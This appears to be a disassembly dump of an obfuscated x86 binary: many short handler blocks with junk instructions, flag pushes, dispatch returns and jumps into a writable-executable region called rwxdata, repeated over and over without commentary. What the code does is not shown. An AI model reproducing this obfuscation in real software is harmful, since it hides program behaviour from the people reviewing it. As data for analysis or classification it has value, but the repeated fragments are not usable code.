ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511a42
cmp ebp eax
mov [ esp ] dl
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
aam 0x81
cdq
or al cl
lea ecx [ ecx + 0x4e212990 ]
mov edx esp
bsr eax esp
test dx dx
lea ecx [ edi + 0x40 ]
ror al 0x1
lea edi [ ecx - 0x26fe5b46 ]
rcr di cl
ror al 0x7
sub ecx edx
jle rwxdata
sbb al ah
lea eax [ ebp - 0x80 ]
and di 0x55d7
btr di ax
push esp
and al 0xfc
shrd di di cl
btr di 0xb
bt dx sp
sub eax ecx
not di
movsx di dl
pushfd
not di
mov esp eax
lea edi [ ecx + 0x304e500f ]
bswap edi
pushfd
call sub_511321
mov [ esp + 0x2c ] edi
pushfd
pushfd
mov [ esp + 0x30 ] ecx
jmp rwxdata
rol al 0x5
bsr edi esp
setpe al
lea eax [ ebp - 0x80 ]
inc di
inc edi
and al 0xfc
sub di 0x367
shrd di sp 0xe
shl di 0xa
sub eax ecx
push 0x2de4c8c2
movsx di bl
mov [ esp ] ebx
movzx di al
mov esp eax
lea edi [ ecx - 0x52028590 ]
not di
push ebp
pushfd
pop [ esp ]
pushad
xchg [ esp + 0x1c ] esi
movsx si bl
pushfd
mov si [ esp ]
mov esi edx
pushfd
push 0xab5f959e
lea edi [ ecx + eax - 0x40 ]
call sub_513599
pushad
cmc
add ebp 0x8
jmp rwxdata
mov [ esp + 0x2c ] edx
push esp
jmp rwxdata
jmp rwxdata
push 0xb196af6
pushfd
pushfd
pop [ esp + 0x34 ]
jmp sub_513c1c
push esi
mov [ ss : eax ] edx
mov [ esp ] bl
lea esp [ esp + 0x2c ]
jmp rwxdata
sub_511b1a
push [ esp + 0x4c ]
pop [ ebp ]
mov [ esp ] 0x3c
mov [ esp ] 0x3
lea esp [ esp + 0x50 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511b3e
mov [ eax ] dx
pushfd
pushad
push [ esp + 0x4 ]
lea esp [ esp + 0x30 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511b50
not eax
clc
bt sp 0xc
pushad
cmp bh 0x77
not edx
push esp
cmc
and eax edx
jmp rwxdata
mov [ ebp + 0x4 ] eax
lea esp [ esp + 0x2c ]
jno rwxdata
call sub_5134be
push 0x4aab8746
mov [ esp ] 0xc0
pushfd
pushfd
pop [ esp + 0x4 ]
call sub_512039
sub_511b76
clc
cmc
sub bl al
test ah al
mov [ esp + 0x4 ] cl
pushfd
cmp cl 0xdb
mov ax [ eax + edi ]
test cl ah
bt sp 0xd
bt dx ax
sub ebp 0x2
mov [ esp ] al
push 0x6c739887
push esi
mov [ ebp ] ax
mov [ esp + 0x8 ] si
mov [ esp + 0x4 ] 0x8b
push 0xf590b208
pushfd
lea esp [ esp + 0x3c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511bf6
mov edi [ esp + 0x24 ]
push [ esp + 0x10 ]
and si 0x9bf4
bsr si cx
std
mov esi [ esp + 0x2c ]
push 0xa60fd622
test dx 0xdac8
jmp rwxdata
push [ esp + 0x34 ]
popfd
pushfd
push esp
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511cb9
pushad
bt si ax
add ebp 0x4
mov [ esp + 0x4 ] bh
mov [ esp + 0x4 ] 0xcdcff144
lea esp [ esp + 0x28 ]
jmp rwxdata
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511d17
pushfd
pushfd
mov [ ebp ] ax
pushad
push [ esp ]
pushfd
lea esp [ esp + 0x34 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511d3c
pushfd
xchg [ ebp + ecx * 4 ] eax
test ch al
pushad
mov [ esp + 0x2c ] eax
cmc
pushfd
stc
sub ecx 0x1
pushfd
push 0x3a4676f0
lea esp [ esp + 0x38 ]
jne rwxdata
cmp sp bp
bt dx 0x7
call sub_5123d1
pushfd
jmp rwxdata
test bh bl
bt si dx
cmc
xor eax eax
jmp rwxdata
push 0xe722813d
mov [ ebp + 0x4 ] eax
pushfd
call sub_511910
stc
cmp ebx 0xfe0
pushad
push [ esp ]
lea esp [ esp + 0x30 ]
jne rwxdata
push 0xf7ae4d09
call sub_513c3e
push 0x7a9168d6
cld
call sub_513e3d
fldcw [ ebp ]
push 0xd323d24b
pushfd
pushad
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
test bl dh
shr bx 0xa
mov bl cl
bt dx 0x9
xor [ ebp + 0xc ] 0x20
lea ebx [ esp + 0x41db6dac ]
pushfd
mov ebx [ esp + 0x4 ]
pushfd
pushfd
push [ esp + 0x4 ]
mov [ esp ] dh
lea esp [ esp + 0x14 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
sub_511dfc
mov [ esp + 0x50 ] 0x0
mov [ esp ] 0x99
mov [ esp + 0x8 ] 0x1a
mov [ esp + 0x4 ] 0x9b
mov [ esp + 0x4 ] edi
lea esp [ esp + 0x50 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511e2b
mov [ esp + 0x20 ] edi
pushad
mov [ esp + 0x18 ] 0xf7
mov [ esp + 0x4 ] 0x6f
mov [ esp + 0x3c ] ecx
call sub_5134a6
lea ecx [ esi - 0x17e17537 ]
not cx
mov ecx [ ebp - 0x4 ]
pushad
call sub_5141cf
mov [ esp + 0x28 ] esi
call sub_51203f
mov [ esp ] 0xd1
push 0xc7af53ff
jmp rwxdata
mov [ esp + 0x20 ] edx
pushad
call sub_5116b8
sub_511eb9
push 0xdf3492e8
mov [ esp + 0x38 ] 0x0
push esp
pushfd
lea esp [ esp + 0x40 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511ee6
pushfd
pop [ esp + 0x30 ]
pushfd
mov [ esp + 0x30 ] ebx
call sub_512454
jmp rwxdata
push ecx
pushad
jmp rwxdata
jmp rwxdata
mov [ esp ] 0x7f88
mov [ esp + 0x1c ] ebp
mov [ esp + 0x4 ] ah
pushad
push edx
mov [ esp + 0x3c ] eax
lea esp [ esp + 0x3c ]
jno rwxdata
pushfd
push esp
mov [ esp + 0x4 ] ch
mov [ esp + 0x4 ] esi
pushad
jmp rwxdata
pushad
push [ esp + 0x8 ]
mov [ esp + 0x20 ] esi
call sub_512eb1
pushad
mov [ esp ] cx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x14 ] 0xec39
mov [ esp + 0x1c ] ebp
lea esp [ esp + 0x1c ]
jge rwxdata
mov [ esp + 0x20 ] edi
call sub_511485
call sub_513c73
call sub_5139c0
dec al
mov edx [ ebp ]
xor al 0xe0
ror al 0x3
sar al cl
add ebp 0x2
mov al ah
mov al [ edx ]
jmp rwxdata
push esp
mov [ esp ] cl
mov [ esp ] eax
jmp rwxdata
call sub_511d17
push esi
push ebx
mov [ esp ] 0x7f
pushfd
mov [ esp + 0x4 ] edi
lea esp [ esp + 0x4 ]
ja rwxdata
pushad
push [ esp ]
push [ esp + 0x4 ]
mov [ esp + 0x24 ] ecx
mov [ esp ] al
call sub_512276
pushfd
mov [ esp ] ecx
pushfd
push esp
jmp rwxdata
mov [ esp + 0x4 ] edx
pushfd
push [ esp ]
pushad
pushfd
pop [ esp + 0x28 ]
jmp rwxdata
mov [ esp + 0x24 ] ebx
mov [ esp + 0x4 ] 0x8a
push [ rwxdata ]
pop [ esp + 0x20 ]
pushfd
mov [ esp + 0x4 ] bh
pushfd
mov [ esp + 0x24 ] 0x0
push [ esp ]
pushfd
mov [ esp ] dl
mov [ esp ] 0x9bb588a3
lea esp [ esp + 0x2c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511f30
lea esp [ esp + 0x14 ]
je rwxdata
test bh bl
bt si dx
cmc
xor eax eax
jmp rwxdata
cmp sp bp
bt dx 0x7
call sub_5123d1
pushfd
jmp rwxdata
push 0xf7ae4d09
call sub_513c3e
push 0x7a9168d6
cld
call sub_513e3d
fldcw [ ebp ]
push 0xd323d24b
pushfd
pushad
lea esp [ esp + 0x30 ]
jmp rwxdata
push 0xe722813d
mov [ ebp + 0x4 ] eax
pushfd
call sub_511910
stc
cmp ebx 0xfe0
pushad
push [ esp ]
lea esp [ esp + 0x30 ]
jne rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
test bl dh
shr bx 0xa
mov bl cl
bt dx 0x9
xor [ ebp + 0xc ] 0x20
lea ebx [ esp + 0x41db6dac ]
pushfd
mov ebx [ esp + 0x4 ]
pushfd
pushfd
push [ esp + 0x4 ]
mov [ esp ] dh
lea esp [ esp + 0x14 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
sub_511f5b
pushad
mov [ ebp ] eax
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511f83
mov [ ebp ] ax
push ebp
lea esp [ esp + 0x2c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511f91
pushad
mov [ esp ] bp
pushfd
pop [ esp + 0x24 ]
push edi
push [ esp + 0x28 ]
pop [ ebp ]
mov [ esp + 0x8 ] sp
mov [ esp ] esi
lea esp [ esp + 0x2c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
